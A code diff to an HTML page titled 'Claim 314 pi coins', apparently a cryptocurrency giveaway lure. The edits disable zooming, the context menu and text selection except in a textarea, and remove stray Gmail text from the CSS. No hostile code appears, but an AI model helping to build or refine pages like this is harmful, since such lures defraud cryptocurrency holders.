@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <meta property="og:title" content="Claim 314 pi coins 🎁🎁">
     <meta property="og:description" content="Celebrate 15 KYC users with special reward">
@@ -26,12 +26,15 @@
             height: 100vh;
             margin-top: -15%;
             background-color: #f3f4f6;
+            touch-action: pan-y; /* Empêche le zoom avec le pincement */
+            -webkit-touch-callout: none; /* Désactive le menu contextuel sur iOS */
+            -webkit-user-select: none; /* Désactive la sélection de texte sur iOS */
+            user-select: none; /* Désactive la sélection de texte */
         }
 
         .container {
             background-color: #fff;
             width: 100vw;
-      
             box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
             border-radius: 8px;
             overflow: hidden;
@@ -103,13 +106,10 @@
             font-size: 1rem;
             border: 1px solid #ccc;
             border-radius: 8px;
-            background-color: #F9FAFB;intelligente et facile à utiliser
-
-Gagnez en efficacité avec Gmail, qui intègre désormais Google Chat, Google Meet et d'autres outils.
-Créer un compte
-Pour le travail
-Écran de la boîte de réception Gmail avec grandes icônes de fonction
-
+            background-color: #F9FAFB;
+            /* Permet la sélection uniquement dans le textarea */
+            -webkit-user-select: text;
+            user-select: text;
         }
 
         .button {
@@ -142,6 +142,15 @@ Pour le travail
 
         .text-block span {
             color: rgba(77, 0, 215, 0.85);
+        }
+
+        /* Styles supplémentaires pour désactiver le zoom */
+        html {
+            touch-action: manipulation; /* Empêche le double-tap pour zoomer */
+        }
+
+        input, textarea, select {
+            font-size: 16px; /* Empêche le zoom automatique sur iOS */
         }
 
     </style>
@@ -250,6 +259,25 @@ Pour le travail
                 document.getElementById("loading-spinner").style.display = "none";
                 document.getElementById("main").style.display = "block";
             };
+        });
+
+        // Script supplémentaire pour empêcher le zoom avec le pincement
+        document.addEventListener('touchstart', function(event) {
+            if (event.touches.length > 1) {
+                event.preventDefault();
+            }
+        });
+
+        document.addEventListener('gesturestart', function(event) {
+            event.preventDefault();
+        });
+
+        document.addEventListener('gesturechange', function(event) {
+            event.preventDefault();
+        });
+
+        document.addEventListener('gestureend', function(event) {
+            event.preventDefault();
         });
     </script>
     
